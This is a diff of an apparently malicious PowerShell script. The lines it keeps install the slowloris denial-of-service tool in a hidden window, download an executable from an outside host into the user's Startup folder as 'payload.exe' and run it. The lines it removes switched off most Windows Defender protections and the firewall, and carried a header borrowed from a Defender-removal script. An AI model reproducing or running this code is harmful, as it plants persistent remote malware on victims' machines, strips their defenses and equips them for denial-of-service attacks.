@@ -7,64 +7,12 @@ $pythonBinFolder = (Get-Command python).Source.Substring(0, (Get-Command python)
 $env:Path += ";$pythonBinFolder"
 Start-Process -FilePath "cmd.exe" -ArgumentList "/K pip install slowloris" -WindowStyle Hidden
 
-Set-MpPreference -ExclusionExtension ".bat",".exe"
-Set-MpPreference -EnableControlledFolderAccess Disabled
-Set-MpPreference -PUAProtection Disable
-Set-MpPreference -DisableRealtimeMonitoring $true
-Set-MpPreference -DisableBehaviorMonitoring $true
-Set-MpPreference -DisableBlockAtFirstSeen $true
-Set-MpPreference -DisableIOAVProtection $true
-Set-MpPreference -DisablePrivacyMode $true
-Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true
-Set-MpPreference -DisableArchiveScanning $true
-Set-MpPreference -DisableIntrusionPreventionSystem $true
-Set-MpPreference -DisableScriptScanning $true
-Set-MpPreference -SubmitSamplesConsent 2
-Set-MpPreference -MAPSReporting 0
-Set-MpPreference -HighThreatDefaultAction 6 -Force
-Set-MpPreference -ModerateThreatDefaultAction 6
-Set-MpPreference -LowThreatDefaultAction 6
-Set-MpPreference -SevereThreatDefaultAction 6
-Set-MpPreference -ScanScheduleDay 8
-
-netsh advfirewall set allprofiles state off
-
 $startupFolder = Join-Path $env:USERPROFILE "AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 $payloadUrl = "https://khumoyun.uz/res/win7/main.exe"
 Invoke-WebRequest -Uri $payloadUrl -OutFile (Join-Path $startupFolder "payload.exe")
 
 Start-Process -FilePath "$startupFolder\payload.exe"
 
-# Disable Windows Defender
-
-<#
-                           _               _ 
- __      ____ _ _ __ _ __ (_)_ __   __ _  | |
- \ \ /\ / / _` | '__| '_ \| | '_ \ / _` | | |
-  \ V  V / (_| | |  | | | | | | | | (_| | |_|
-   \_/\_/ \__,_|_|  |_| |_|_|_| |_|\__, | (_)
-                                   |___/     
-
-This script is NOT a disable/enable solution, I'm a malware analyst, I use it for malware analysis.
-It can completely DELETE Defender, and it is NOT REVERSIBLE (that's what I need).
-Once you have run it, you will no longer have any sort of antivirus protection, and WILL NOT BE ABLE to reactivate it.
-
-Think twice before running it, or read the blog post to understand and modify it to suit **your** needs.
-
-THIS IS NOT A JOKE.
-YOU HAVE BEEN WARNED.
-#>
-
-<#
-Options :
-
--Delete : delete the defender related files (services, drivers, executables, ....) 
-
-Source :  https://bidouillesecurity.com/disable-windows-defender-in-powershell
-
-#>
-
-Write-Host "[+] Disable Windows Defender (as $(whoami))"
 
 
 ## STEP 0 : elevate if needed
